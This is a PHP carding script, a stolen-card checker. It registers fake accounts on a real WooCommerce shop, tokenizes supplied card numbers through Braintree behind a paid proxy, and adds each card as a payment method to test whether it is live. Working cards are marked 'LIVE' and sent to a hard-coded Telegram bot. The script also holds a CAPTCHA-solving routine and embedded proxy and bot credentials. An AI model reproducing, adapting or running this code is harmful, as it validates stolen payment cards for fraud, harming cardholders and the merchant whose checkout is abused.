<?php
    error_reporting(0);
    $time_start = microtime(true);
    set_time_limit(200);
    include("firstDataMessage.php");
    function GetStr($string, $start, $end){
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }


    function RandomString($length = 16)
    {
        $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString     = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }
    
   function cURLc($url, $headers, $postfields, $customrequest) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            // CURLOPT_SSL_VERIFYPEER => 1, 
            // CURLOPT_SSL_VERIFYHOST => 1, 
            // CURLOPT_COOKIE => "itrack=$cookie",
            CURLOPT_HEADER => 1,
            CURLOPT_CUSTOMREQUEST => $customrequest,
            CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
    function cURL($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => $_fls,
            // CURLOPT_SSL_VERIFYPEER => 0, 
            // CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_COOKIE => "itrack=$cookie",
            CURLOPT_HEADER => 1,
            CURLOPT_CUSTOMREQUEST => $customrequest,
            CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }
   
     function cURL_ProxyOn($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

        $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => $_fls,
            // CURLOPT_PROXY => "http://scraperapi.session_number=$port.ultra_premium=true.country_code=uk:f73965b26e9d8457634c8b1597c0e6da@proxy-server.scraperapi.com:8001/",
            CURLOPT_PROXY => "isp2.hydraproxy.com:9989", 
            CURLOPT_PROXYUSERPWD => "rodm26298vzpo63485:SILNes0gboZ7gsle",
            CURLOPT_HEADER => 1,
            CURLOPT_COOKIE => "itrack=$cookie",
            CURLOPT_CUSTOMREQUEST => $customrequest,
            CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_POSTFIELDS => $postfields
        ));
        $response = curl_exec($ch);
        curl_close($ch);

        return $response;
    }

    extract($_GET);
    $separator = explode("|", $lista);
    $amnt = $amount;
    $cc = $separator[0];
    $ccbin = substr($cc, 0,6);
    $mm = $separator[1];
    $yy = $separator[2];
    $yy1 = substr($yy, 2,2);
    $cvv = $separator[3];
    $cookie = RandomString();
    $cbin = substr($cc, 0,1);
    $rnum = rand(1111,9999);
    $str = substr(randomString(), 0,7);

    if($cbin == 5){ 
    $cbin = 'masterCard'; 
    } 
    else if($cbin == 4){ 
    $cbin = 'visa'; 
    } 

function solveCaptcha($site,$siteKey,$clientKey){
$createTask =  cURLc(
        "https://api.capmonster.cloud/createTask",
        $headers = [
               "Content-Type: application/json",
                "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","task":{"type":"NoCaptchaTaskProxyless","websiteURL":"'.$site.'","websiteKey":"'.$siteKey.'"}}',
        "POST"
    );
 $taskId = getstr(json_encode($createTask,true),'"taskId\":','}');
 $status = "processing";
 $gResponse = "";
  while ($status == "processing") {
    sleep(3);
    $getTaskResult =  cURLc(
        "https://api.capmonster.cloud/getTaskResult ",
        $headers = [
                "Content-Type: application/json",
                "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","taskId": '.$taskId.'}',
        "POST"
    );
 $status = getstr($getTaskResult,'"status":"','"');
 $gResponse = getstr($getTaskResult,'"gRecaptchaResponse":"','"');}
return $getTaskResult ;
}
     $port = rand(10000, 11000);

function get_bankinfo($ccbins){
    $ch = curl_init();
        curl_setopt_array($ch, array(
            CURLOPT_URL => "https://binov.net/",
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_FOLLOWLOCATION => 1,
            CURLOPT_HEADER => 1,
            CURLOPT_HTTPHEADER => [
            "Content-Type: application/x-www-form-urlencoded",
            "Referer: https://binov.net/",
           'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32'
            ],
            CURLOPT_POSTFIELDS => "BIN=$ccbins"
        ));
        $g_ccdets = curl_exec($ch);
        $cc_type0 = GetStr($g_ccdets, "$cc_bin</td><td>" , '</td>');
        $cc_bname = GetStr($g_ccdets, "$cc_type0</td><td>" , '</td>');
        $cc_type1 = GetStr($g_ccdets, "$cc_bname</td><td>" , '</td>');
        $cc_type2 = GetStr($g_ccdets, "$cc_type1</td><td>" , '</td>');
        $cc_country = GetStr($g_ccdets, "$cc_type2</td><td>" , '</td>');
        // return array($cc_type0 => $cc_type0, $cc_bname => $cc_bname, $cc_type1 => $cc_type1, $cc_type2 => $cc_type2, $cc_country => $cc_country);
         $CC_fDets = "Bank: $cc_bname Country: $cc_country";
         return  $CC_fDets;
}
        //$cc_bin = GetStr($g_ccdets, '</tr><tr><td>' , '</td>');
        
        // $CC_fDets = "BIN: $ccbin BIN Info: $type0-$type1-$type2 Bank: $cc_bname Country: $cc_country";
        $CC_fDets = "Bank: $cc_bname Country: $cc_country";
       $randomShits = file_get_contents('https://namegenerator.in/assets/refresh.php?location=united-states');
    $data = json_decode($randomShits, true);
    $fname = explode(" ", $data['name'])[0];
    $lname = explode(" ", $data['name'])[1];
    $email = $data['email']['address'];
    $street = $data['street1'];
    $local = GetStr($randomShits, '"street2":', ',"phone"');
    $city = GetStr($local, '"', ',');
    $state = GetStr($local, ', ', ' ');
    $phone = str_replace("-", "", $data['phone']);
    $postcode = GetStr($local, "$state" , '"');
    // $ips = GetStr(file_get_contents('http://httpbin.org/ip'),'"origin": "','"');   
 $ips = "NULL"; 
$retries = 0;
// $transaction_complete = false;
// while ($retries < 1 && $transaction_complete == false) {
    # code...

   $PAGE = cURL(
       'https://mltdmics.com/my-account/',
        $headers = [
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
        ],
        "",
        "GET",
         1,
        $cookie

    );
        $login_nonce = GetStr($PAGE,'name="woocommerce-login-nonce" value="','"');
        $register_nonce = GetStr($PAGE,'name="woocommerce-register-nonce" value="','"');

     $add_payment =  cURL(
        "https://mltdmics.com/my-account/",
        $headers = [
            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "content-type: application/x-www-form-urlencoded",
            "referer: https://mltdmics.com/my-account/",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47"
        ],
        // "username=docugs030401%40aol.com&password=Asdasd123123%40&rememberme=forever&woocommerce-login-nonce=$login_nonce&_wp_http_referer=%2Fmy-account%2F&login=Log+in",
         "email=$email&password=Asdasd123123%40&woocommerce-register-nonce=36a5c6cb66&_wp_http_referer=%2Fmy-account%2F&register=Register",
        "POST",
       1,
        $cookie
    );  
    $edit_address = cURL(
       'https://mltdmics.com/my-account/edit-address/billing/',
        $headers = [
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
                "https://mltdmics.com/my-account/edit-address/",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
        ],
        "",
        "GET",
         1,
        $cookie
    ); $save_address = GetStr($edit_address,'name="woocommerce-edit-address-nonce" value="','"');

    $confirm_address = cURL(
       'https://mltdmics.com/my-account/edit-address/billing/',
        $headers = [
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
                "https://mltdmics.com/my-account/edit-address/",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
        ],
        "billing_first_name=$fname&billing_last_name=$lname&billing_company=&billing_country=US&billing_address_1=$street&billing_address_2=&billing_city=$city&billing_state=$state&billing_postcode=$postcode&billing_phone=$phone&billing_email=$email&save_address=Save+address&woocommerce-edit-address-nonce=$save_address&_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&action=edit_address",
        "POST",
         1,
        $cookie
    );

     $prepare_pm = cURL(
       'https://mltdmics.com/my-account/add-payment-method/',
        $headers = [
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47",
                "referer: https://mltdmics.com/my-account/edit-address/",
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
        ],
        "",
        "GET",
         1,
        $cookie

    );  $add_pm_nonce = GetStr($prepare_pm,'name="woocommerce-add-payment-method-nonce" value="','"');
        $cc_ajax_nonce = GetStr($prepare_pm,'"type":"credit_card","client_token_nonce":"','"');
     $ajax =  cURL(
        "https://mltdmics.com/wp-admin/admin-ajax.php",
        $headers = [
            "accept: */*",
            "content-type: application/x-www-form-urlencoded; charset=UTF-8",
            "origin: https://mltdmics.com",
            "referer: https://mltdmics.com/my-account/add-payment-method/",
            "x-requested-with: XMLHttpRequest",
            "sec-fetch-site: same-origin",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47"
        ],
        'action=wc_braintree_credit_card_get_client_token&nonce='.$cc_ajax_nonce,
        "POST",
        1,
        $cookie
    );  $data = json_decode(base64_decode(GetStr($ajax,'"data":"','"')), true);
        $fPrint = $data['authorizationFingerprint'];
        $acc_token = $data['access_token'];


  $graphl =  cURL_ProxyOn(
        "https://payments.braintree-api.com/graphql",
        $headers = [
            "accept: */*",
            "Content-Type: application/json",
            "Authorization: Bearer $fPrint",
            "Host: payments.braintree-api.com",
            "Origin: https://assets.braintreegateway.com",
            "Referer: https://assets.braintreegateway.com/",
            "Braintree-Version: 2018-05-10",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47"
        ],
        '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"'.randomString().'"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
        "POST",
        1,
        $cookie
    );  $token = GetStr($graphl,'"token":"','"');

   
   ECHO $execute =  cURL_ProxyOn(
        "https://mltdmics.com/my-account/add-payment-method/",
        $headers = [
            "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "content-type: application/x-www-form-urlencoded",
            "referer: https://mltdmics.com/my-account/add-payment-method/",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47"
        ],
        "wc_braintree_paypal_payment_nonce=&wc_braintree_device_data=%7B%22correlation_id%22%3A%22e22bd3c1efba46296d7c9084c74c1a8b%22%7D&wc_braintree_paypal_amount=0.00&wc_braintree_paypal_currency=USD&wc_braintree_paypal_locale=en_us&wc-braintree-paypal-tokenize-payment-method=true&payment_method=braintree_credit_card&wc-braintree-credit-card-card-type=visa&wc-braintree-credit-card-3d-secure-enabled=&wc-braintree-credit-card-3d-secure-verified=&wc-braintree-credit-card-3d-secure-order-total=0.00&wc_braintree_credit_card_payment_nonce=$token&wc_braintree_device_data=%7B%22correlation_id%22%3A%22e22bd3c1efba46296d7c9084c74c1a8b%22%7D&wc-braintree-credit-card-tokenize-payment-method=true&woocommerce-add-payment-method-nonce=$add_pm_nonce&_wp_http_referer=%2Fmy-account%2Fadd-payment-method%2F&woocommerce_add_payment_method=1",
        "POST",
       1,
        $cookie
    );  $erl = urlencode($execute);

   $dcode =  GetStr($execute, 'Status code ',':');
   $response = GetStr($execute,'Status code '.$dcode.': ','</li>');

        if (strpos($execute, 'Nice! New payment method added:')){   
             $lnk = GetStr($execute,' class="button save">Save</a>&nbsp;<a href="','"');
           echo  $delete_save_card =  cURL(
            "$lnk",
             $headers = [
                "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "referer: https://mltdmics.com/my-account/add-payment-method/",
                "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47"
                ],
                "",
                "GET",
                1,
                $cookie
        );$transaction_complete = true;
          $response = "Matched";
        }elseif(strpos($erl, 'Status+code+')){
         $transaction_complete = true;
        }
  



    if($response == "Matched") {
        $bankinfo = get_bankinfo($ccbin);
        echo '<tr><td><span class="badge bg-success">LIVE</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">CCN - BRAINTREE AUTH</span> <span class="badge bg-light text-dark">'.$bankinfo.'</span></td></tr><br>';
        file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text='.$lista.' CHARGED CCN - Braintree Auth INFO['.$bankinfo.']');
        sleep(5);
    }else if(strpos($execute, 'Status code')) {
        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">'.$response.'('.$dcode.') - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
    }else {
        echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">Processing unsuccessful(May be Merchant is dead or network is blocked) - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
    }

    unlink("cookies/$cookie.txt");

?>  